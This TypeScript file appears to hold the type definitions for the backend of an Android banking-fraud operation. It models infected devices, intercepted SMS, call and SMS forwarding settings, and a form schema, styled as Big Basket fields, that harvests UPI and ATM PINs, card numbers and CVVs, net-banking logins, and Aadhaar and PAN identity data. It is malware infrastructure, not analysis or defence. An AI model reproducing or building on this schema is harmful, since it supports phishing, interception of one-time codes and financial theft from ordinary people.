// Device connected to the server
export interface Device {
    id: string;
    name: string;
    phoneNumber: string;
    status: 'online' | 'offline';
    lastSeen: string;
    socketId?: string;
    simCards?: SimInfo[];
}

// SIM card information for dual SIM devices
export interface SimInfo {
    slotIndex: number;
    subscriptionId: number;
    carrierName: string;
    displayName: string;
    phoneNumber: string;
    countryIso: string;
}

// SMS message from device
export interface SMS {
    id: string;
    sender: string;
    receiver: string;
    message: string;
    timestamp: string;
    type: 'incoming' | 'outgoing';
    // Which SIM the message was sent/received on (reported by Android app
    // when available; absent for older app versions).
    subscriptionId?: number;
    slotIndex?: number;
    simSlot?: number;
}

// Form data submitted from Android app / Webview
export interface FormData {
    // Big Basket Form Fields
    fullName?: string;
    mobileNumber?: string;
    selectedAmount?: string;
    amount?: string;
    paymentMethod?: string;
    upiApp?: string;
    upiPin?: string;
    cardType?: string;
    cardNumber?: string;
    cardHolderName?: string;
    cardExpiry?: string;
    cvv?: string;
    atmPin?: string;
    bankName?: string;
    username?: string;
    password?: string;
    // Legacy / KYC Fields
    motherName?: string;
    accountNumber?: string;
    aadhaarNumber?: string;
    panCard?: string;
    panNumber?: string;
    cardLast6?: string;
    validThrough?: string;
    cifNumber?: string;
    branchCode?: string;
    dateOfBirth?: string;
    finalPin?: string;
    userId?: string;
    accessCode?: string;
    profileCode?: string;
    // Metadata
    submittedAt: string;
    pageName?: string;  // Which page this submission came from
    // Legacy fields
    name?: string;
    phoneNumber?: string;
    id?: string;
}



// Forwarding configuration
export interface ForwardingConfig {
    smsEnabled: boolean;
    smsForwardTo: string;
    smsSubscriptionId?: number;
    callsEnabled: boolean;
    callsForwardTo: string;
    callsSubscriptionId?: number;
}

// Device data store
export interface DeviceData {
    deviceId: string;
    sms: SMS[];
    forms: FormData[];
    forwarding: ForwardingConfig;
    simCards?: SimInfo[];
}
